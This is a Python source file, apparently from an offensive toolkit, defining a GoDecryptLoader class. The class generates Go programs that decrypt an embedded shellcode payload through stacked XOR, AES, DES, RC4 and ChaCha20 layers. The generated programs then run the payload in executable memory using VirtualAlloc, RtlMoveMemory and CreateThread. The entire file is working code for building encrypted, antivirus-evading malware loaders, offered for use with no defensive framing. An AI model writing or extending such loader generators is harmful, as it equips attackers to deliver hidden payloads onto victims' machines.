#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Go解密加载器模块：单一职责 - 仅实现Go解密加载器生成，遵循BaseLoader接口
"""
from core.loader.base_loader import BaseLoader
from core.encrypt.encrypt_manager import EncryptionHistory

class GoDecryptLoader(BaseLoader):
    """Go解密加载器：单一职责 - 仅生成Go解密加载器（适配加密历史）"""
    @property
    def lang_name(self) -> str:
        return "Go"
    
    def generate_raw(self, shellcode_len: int) -> str:
        """（解密加载器可复用原始加载器逻辑）"""
        from core.loader.raw_loader.go_raw_loader import GoRawLoader
        return GoRawLoader().generate_raw(shellcode_len)
    
    def generate_decrypt(self, shellcode_len: int, encryption_history: EncryptionHistory) -> str:
        """生成Go解密加载器内容（适配XOR/AES-256-CBC/DES-CBC/RC4/ChaCha20加密历史）"""
        encrypt_history = encryption_history.get_full_history()
        decrypt_functions = []
        decrypt_calls = []
        key_iv_definitions = []
        imports = set()

        # 构建解密函数和调用逻辑（按加密逆序解密）
        for idx, encrypt_info in enumerate(reversed(encrypt_history), 1):
            alg = encrypt_info["alg"]
            params = encrypt_info["params"]

            if alg == "XOR":
                # XOR解密定义
                key_hex = params["key_hex"]
                key_len = params["key_len"]
                key_def = f"// XOR解密密钥（第{idx}轮加密）\nvar xorKey{idx} = []byte{{{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}}}\nvar xorKeyLen{idx} = {key_len}"
                key_iv_definitions.append(key_def)

                xor_decrypt = f"""// XOR解密函数（第{idx}轮）
func xorDecrypt{idx}(shellcode []byte) {{
    for i := range shellcode {{
        shellcode[i] ^= xorKey{idx}[i % xorKeyLen{idx}]
    }}
}}"""
                decrypt_functions.append(xor_decrypt)
                decrypt_calls.append(f"xorDecrypt{idx}(shellcode)")

            elif alg == "AES-256-CBC":
                # AES-256-CBC解密定义（依赖crypto/aes）
                key_hex = params["key_hex"]
                iv_hex = params["iv_hex"]
                key_def = f"// AES-256-CBC解密密钥和IV（第{idx}轮加密）\nvar aesKey{idx} = []byte{{{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}}}\nvar aesIV{idx} = []byte{{{', '.join([f'0x{iv_hex[i:i+2]}' for i in range(0, len(iv_hex), 2)])}}}"
                key_iv_definitions.append(key_def)
                
                # 添加必要的导入
                imports.add("crypto/aes")
                imports.add("crypto/cipher")
                imports.add("errors")

                aes_decrypt = "// AES-256-CBC解密函数（第{idx}轮）\n" \
                             "func aes256CbcDecrypt{idx}(shellcode []byte) ([]byte, error) {{\n" \
                             "    block, err := aes.NewCipher(aesKey{idx})\n" \
                             "    if err != nil {{\n" \
                             "        return nil, err\n" \
                             "    }}\n" \
                             "\n" \
                             "    if len(shellcode) % aes.BlockSize != 0 {{\n" \
                             "        return nil, errors.New(\"invalid shellcode length for AES decryption\")\n" \
                             "    }}\n" \
                             "\n" \
                             "    mode := cipher.NewCBCDecrypter(block, aesIV{idx})\n" \
                             "    mode.CryptBlocks(shellcode, shellcode)\n" \
                             "    \n" \
                             "    // 去除PKCS7填充（仅当填充存在时）\n" \
                             "    if len(shellcode) == 0 {{\n" \
                             "        return nil, errors.New(\"empty shellcode after decryption\")\n" \
                             "    }}\n" \
                             "    padLen := int(shellcode[len(shellcode)-1])\n" \
                             "    if padLen > 0 && padLen <= aes.BlockSize && padLen <= len(shellcode) {{\n" \
                             "        // 验证填充是否有效\n" \
                             "        validPadding := true\n" \
                             "        for i := len(shellcode) - padLen; i < len(shellcode); i++ {{\n" \
                             "            if int(shellcode[i]) != padLen {{\n" \
                             "                validPadding = false\n" \
                             "                break\n" \
                             "            }}\n" \
                             "        }}\n" \
                             "        if validPadding {{\n" \
                             "            return shellcode[:len(shellcode)-padLen], nil\n" \
                             "        }}\n" \
                             "    }}\n" \
                             "    // 如果没有有效填充，返回原始解密数据\n" \
                             "    return shellcode, nil\n" \
                             "}}"

                aes_decrypt = aes_decrypt.format(idx=idx)


                decrypt_functions.append(aes_decrypt)
                decrypt_calls.append(f"shellcode, err = aes256CbcDecrypt{idx}(shellcode)\n    if err != nil {{ panic(err) }}")

            elif alg == "DES-CBC":
                # DES-CBC解密定义（依赖crypto/des）
                key_hex = params["key_hex"]
                iv_hex = params["iv_hex"]
                key_def = f"// DES-CBC解密密钥和IV（第{idx}轮加密）\nvar desKey{idx} = []byte{{{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}}}\nvar desIV{idx} = []byte{{{', '.join([f'0x{iv_hex[i:i+2]}' for i in range(0, len(iv_hex), 2)])}}}"
                key_iv_definitions.append(key_def)
                
                # 添加必要的导入
                imports.add("crypto/des")
                imports.add("crypto/cipher")
                imports.add("errors")

                des_decrypt = "// DES-CBC解密函数（第{idx}轮）\n" \
                             "func desCbcDecrypt{idx}(shellcode []byte) ([]byte, error) {{\n" \
                             "    block, err := des.NewCipher(desKey{idx})\n" \
                             "    if err != nil {{\n" \
                             "        return nil, err\n" \
                             "    }}\n" \
                             "\n" \
                             "    if len(shellcode) % des.BlockSize != 0 {{\n" \
                             "        return nil, errors.New(\"invalid shellcode length for DES decryption\")\n" \
                             "    }}\n" \
                             "\n" \
                             "    mode := cipher.NewCBCDecrypter(block, desIV{idx})\n" \
                             "    mode.CryptBlocks(shellcode, shellcode)\n" \
                             "    \n" \
                             "    // 去除PKCS7填充（仅当填充存在时）\n" \
                             "    if len(shellcode) == 0 {{\n" \
                             "        return nil, errors.New(\"empty shellcode after decryption\")\n" \
                             "    }}\n" \
                             "    padLen := int(shellcode[len(shellcode)-1])\n" \
                             "    if padLen > 0 && padLen <= des.BlockSize && padLen <= len(shellcode) {{\n" \
                             "        // 验证填充是否有效\n" \
                             "        validPadding := true\n" \
                             "        for i := len(shellcode) - padLen; i < len(shellcode); i++ {{\n" \
                             "            if int(shellcode[i]) != padLen {{\n" \
                             "                validPadding = false\n" \
                             "                break\n" \
                             "            }}\n" \
                             "        }}\n" \
                             "        if validPadding {{\n" \
                             "            return shellcode[:len(shellcode)-padLen], nil\n" \
                             "        }}\n" \
                             "    }}\n" \
                             "    // 如果没有有效填充，返回原始解密数据\n" \
                             "    return shellcode, nil\n" \
                             "}}"

                des_decrypt = des_decrypt.format(idx=idx)


                decrypt_functions.append(des_decrypt)
                decrypt_calls.append(f"shellcode, err = desCbcDecrypt{idx}(shellcode)\n    if err != nil {{ panic(err) }}")

            elif alg == "RC4":
                # RC4解密定义
                key_hex = params["key_hex"]
                key_len = params["key_len"]
                key_def = f"// RC4解密密钥（第{idx}轮加密）\nvar rc4Key{idx} = []byte{{{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}}}\nvar rc4KeyLen{idx} = {key_len}"
                key_iv_definitions.append(key_def)

                rc4_decrypt = f"""// RC4解密函数（第{idx}轮）
func rc4Decrypt{idx}(shellcode []byte) {{
    // 初始化S盒
    sBox := make([]byte, 256)
    for i := range sBox {{
        sBox[i] = byte(i)
    }}
    j := 0
    for i := 0; i < 256; i++ {{
        j = (j + int(sBox[i]) + int(rc4Key{idx}[i % rc4KeyLen{idx}])) % 256
        sBox[i], sBox[j] = sBox[j], sBox[i]
    }}
    
    // 解密过程
    i := 0
    j = 0
    for k := range shellcode {{
        i = (i + 1) % 256
        j = (j + int(sBox[i])) % 256
        sBox[i], sBox[j] = sBox[j], sBox[i]
        t := (int(sBox[i]) + int(sBox[j])) % 256
        kValue := sBox[t]
        shellcode[k] ^= kValue
    }}
}}"""
                decrypt_functions.append(rc4_decrypt)
                decrypt_calls.append(f"rc4Decrypt{idx}(shellcode)")

            elif alg == "ChaCha20":
                # ChaCha20解密定义
                key_hex = params["key_hex"]
                nonce_hex = params["nonce_hex"]
                # 使用完整的16字节nonce，符合Python cryptography库的要求
                key_def = f"// ChaCha20解密密钥和Nonce（第{idx}轮加密）\nvar chacha20Key{idx} = []byte{{{', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])}}}\nvar chacha20Nonce{idx} = []byte{{{', '.join([f'0x{nonce_hex[i:i+2]}' for i in range(0, len(nonce_hex), 2)])}}}"
                key_iv_definitions.append(key_def)
                
                # 不需要导入外部包，使用纯Go实现

                chacha20_decrypt = """// ChaCha20解密函数（第{idx}轮）
// 纯Go实现，正确处理16字节nonce
// 基于ChaCha20-128（RFC 8439），与C实现保持一致

// ChaCha20轮函数
func chacha20QuarterRound{idx}(a, b, c, d uint32) (uint32, uint32, uint32, uint32) {{
    a += b
    d ^= a
    d = (d << 16) | (d >> 16)
    c += d
    b ^= c
    b = (b << 12) | (b >> 20)
    a += b
    d ^= a
    d = (d << 8) | (d >> 24)
    c += d
    b ^= c
    b = (b << 7) | (b >> 25)
    return a, b, c, d
}}

// ChaCha20块生成函数
func chacha20Block{idx}(state [16]uint32) [64]byte {{
    var workingState [16]uint32
    copy(workingState[:], state[:])
    
    // 执行20轮（10次迭代，每次2轮）
    for i := 0; i < 10; i++ {{
        // 列混淆
        workingState[0], workingState[4], workingState[8], workingState[12] = chacha20QuarterRound{idx}(workingState[0], workingState[4], workingState[8], workingState[12])
        workingState[1], workingState[5], workingState[9], workingState[13] = chacha20QuarterRound{idx}(workingState[1], workingState[5], workingState[9], workingState[13])
        workingState[2], workingState[6], workingState[10], workingState[14] = chacha20QuarterRound{idx}(workingState[2], workingState[6], workingState[10], workingState[14])
        workingState[3], workingState[7], workingState[11], workingState[15] = chacha20QuarterRound{idx}(workingState[3], workingState[7], workingState[11], workingState[15])
        
        // 对角线混淆
        workingState[0], workingState[5], workingState[10], workingState[15] = chacha20QuarterRound{idx}(workingState[0], workingState[5], workingState[10], workingState[15])
        workingState[1], workingState[6], workingState[11], workingState[12] = chacha20QuarterRound{idx}(workingState[1], workingState[6], workingState[11], workingState[12])
        workingState[2], workingState[7], workingState[8], workingState[13] = chacha20QuarterRound{idx}(workingState[2], workingState[7], workingState[8], workingState[13])
        workingState[3], workingState[4], workingState[9], workingState[14] = chacha20QuarterRound{idx}(workingState[3], workingState[4], workingState[9], workingState[14])
    }}
    
    // 添加原始状态
    for i := 0; i < 16; i++ {{
        workingState[i] += state[i]
    }}
    
    // 转换为字节
    var keystream [64]byte
    for i := 0; i < 16; i++ {{
        keystream[4*i] = byte(workingState[i] & 0xFF)
        keystream[4*i+1] = byte((workingState[i] >> 8) & 0xFF)
        keystream[4*i+2] = byte((workingState[i] >> 16) & 0xFF)
        keystream[4*i+3] = byte((workingState[i] >> 24) & 0xFF)
    }}
    
    return keystream
}}

// ChaCha20解密函数
func chacha20Decrypt{idx}(shellcode []byte) ([]byte, error) {{
    // 初始化状态矩阵
    var state [16]uint32
    
    // 设置常量（"expand 32-byte k"的ASCII值）
    state[0] = 0x61707865
    state[1] = 0x3320646e
    state[2] = 0x79622d32
    state[3] = 0x6b206574
    
    // 设置32字节密钥
    for i := 0; i < 8; i++ {{
        state[4+i] = uint32(chacha20Key{idx}[i*4]) | uint32(chacha20Key{idx}[i*4+1])<<8 | uint32(chacha20Key{idx}[i*4+2])<<16 | uint32(chacha20Key{idx}[i*4+3])<<24
    }}
    
    // 设置16字节nonce（与C实现保持一致）
    for i := 0; i < 4; i++ {{
        state[12+i] = uint32(chacha20Nonce{idx}[i*4]) | uint32(chacha20Nonce{idx}[i*4+1])<<8 | uint32(chacha20Nonce{idx}[i*4+2])<<16 | uint32(chacha20Nonce{idx}[i*4+3])<<24
    }}
    
    // 生成密钥流并解密
    for blockStart := 0; blockStart < len(shellcode); blockStart += 64 {{
        // 生成64字节密钥流
        keystream := chacha20Block{idx}(state)
        
        // 异或解密
        blockSize := 64
        if blockStart+64 > len(shellcode) {{
            blockSize = len(shellcode) - blockStart
        }}
        
        for i := 0; i < blockSize; i++ {{
            shellcode[blockStart+i] ^= keystream[i]
        }}
        
        // 递增计数器（与C实现保持一致）
        state[12]++
        if state[12] == 0 {{
            state[13]++
            if state[13] == 0 {{
                state[14]++
                if state[14] == 0 {{
                    state[15]++
                }}
            }}
        }}
    }}
    
    return shellcode, nil
}}
""".format(idx=idx)

                decrypt_functions.append(chacha20_decrypt)
                decrypt_calls.append(f"shellcode, err = chacha20Decrypt{idx}(shellcode)\n    if err != nil {{ panic(err) }}")

        # 构建导入语句
        import_lines = []
        import_lines.append("syscall")
        import_lines.append("unsafe")
        for imp in sorted(imports):
            import_lines.append(imp)

        # 构建完整的加载器代码
        full_decrypt_content = "package main\n\n"
        
        # 添加导入语句
        full_decrypt_content += "import (\n"
        full_decrypt_content += "    \"syscall\"\n"
        full_decrypt_content += "    \"unsafe\"\n"
        for imp in sorted(imports):
            full_decrypt_content += f"    \"{imp}\"\n"
        full_decrypt_content += ")\n\n"
        
        # 添加常量定义
        full_decrypt_content += "const (\n"
        full_decrypt_content += "    MEM_COMMIT  = 0x1000\n"
        full_decrypt_content += "    MEM_RESERVE = 0x2000\n"
        full_decrypt_content += "    PAGE_EXECUTE_READWRITE = 0x40\n"
        full_decrypt_content += "    INFINITE = 0xFFFFFFFF\n"
        full_decrypt_content += ")\n\n"
        
        # 添加变量定义
        full_decrypt_content += "var (\n"
        full_decrypt_content += "    kernel32 = syscall.NewLazyDLL(\"kernel32.dll\")\n"
        full_decrypt_content += "    \n"
        full_decrypt_content += "    virtualAlloc = kernel32.NewProc(\"VirtualAlloc\")\n"
        full_decrypt_content += "    rtlMoveMemory = kernel32.NewProc(\"RtlMoveMemory\")\n"
        full_decrypt_content += "    createThread = kernel32.NewProc(\"CreateThread\")\n"
        full_decrypt_content += "    waitForSingleObject = kernel32.NewProc(\"WaitForSingleObject\")\n"
        full_decrypt_content += "    virtualFree = kernel32.NewProc(\"VirtualFree\")\n"
        full_decrypt_content += "    closeHandle = kernel32.NewProc(\"CloseHandle\")\n"
        full_decrypt_content += ")\n\n"
        
        # 添加密钥和IV定义
        full_decrypt_content += "\n\n".join(key_iv_definitions)
        full_decrypt_content += "\n\n"
        
        # 添加解密函数
        full_decrypt_content += "\n\n".join(decrypt_functions)
        full_decrypt_content += "\n\n"
        
        # 添加main函数
        full_decrypt_content += "func main() {\n"
        full_decrypt_content += "    // 占位符：替换为你的加密后格式化shellcode\n"
        full_decrypt_content += "    shellcode := []byte{/* 此处填入字节数组格式shellcode */}\n"
        full_decrypt_content += f"    shellcodeLen := {shellcode_len}\n"
        full_decrypt_content += "    var err error\n"
        full_decrypt_content += "    \n"
        full_decrypt_content += "    // 执行解密（按加密逆序）\n"
        
        # 添加解密调用语句
        for call in decrypt_calls:
            full_decrypt_content += f"    {call}\n"
        
        # 添加剩余的main函数代码
        full_decrypt_content += "    // 刷新shellcode长度（解密后可能变化）\n"
        full_decrypt_content += "    shellcodeLen = len(shellcode)\n"
        full_decrypt_content += "    \n"
        full_decrypt_content += "    // 分配可执行内存\n"
        full_decrypt_content += "    mem, _, err := virtualAlloc.Call(\n"
        full_decrypt_content += "        0,\n"
        full_decrypt_content += "        uintptr(shellcodeLen),\n"
        full_decrypt_content += "        uintptr(MEM_COMMIT|MEM_RESERVE),\n"
        full_decrypt_content += "        uintptr(PAGE_EXECUTE_READWRITE),\n"
        full_decrypt_content += "    )\n"
        full_decrypt_content += "    if mem == 0 {\n"
        full_decrypt_content += "        panic(\"VirtualAlloc failed: \" + err.Error())\n"
        full_decrypt_content += "    }\n"
        full_decrypt_content += "    \n"
        full_decrypt_content += "    // 复制解密后的shellcode到内存\n"
        full_decrypt_content += "    _, _, _ = rtlMoveMemory.Call(\n"
        full_decrypt_content += "        mem,\n"
        full_decrypt_content += "        uintptr(unsafe.Pointer(&shellcode[0])),\n"
        full_decrypt_content += "        uintptr(shellcodeLen),\n"
        full_decrypt_content += "    )\n"
        full_decrypt_content += "    \n"
        full_decrypt_content += "    // 创建线程执行shellcode\n"
        full_decrypt_content += "    hThread, _, err := createThread.Call(\n"
        full_decrypt_content += "        0,\n"
        full_decrypt_content += "        0,\n"
        full_decrypt_content += "        mem,\n"
        full_decrypt_content += "        0,\n"
        full_decrypt_content += "        0,\n"
        full_decrypt_content += "        0,\n"
        full_decrypt_content += "    )\n"
        full_decrypt_content += "    if hThread == 0 {\n"
        full_decrypt_content += "        panic(\"CreateThread failed: \" + err.Error())\n"
        full_decrypt_content += "    }\n"
        full_decrypt_content += "    \n"
        full_decrypt_content += "    // 等待线程执行完成\n"
        full_decrypt_content += "    _, _, _ = waitForSingleObject.Call(\n"
        full_decrypt_content += "        hThread,\n"
        full_decrypt_content += "        uintptr(INFINITE),\n"
        full_decrypt_content += "    )\n"
        full_decrypt_content += "    \n"
        full_decrypt_content += "    // 清理资源\n"
        full_decrypt_content += "    _, _, _ = closeHandle.Call(hThread)\n"
        full_decrypt_content += "    _, _, _ = virtualFree.Call(\n"
        full_decrypt_content += "        mem,\n"
        full_decrypt_content += "        0,\n"
        full_decrypt_content += "        0x8000, // MEM_RELEASE\n"
        full_decrypt_content += "    )\n"
        full_decrypt_content += "}"

        return full_decrypt_content
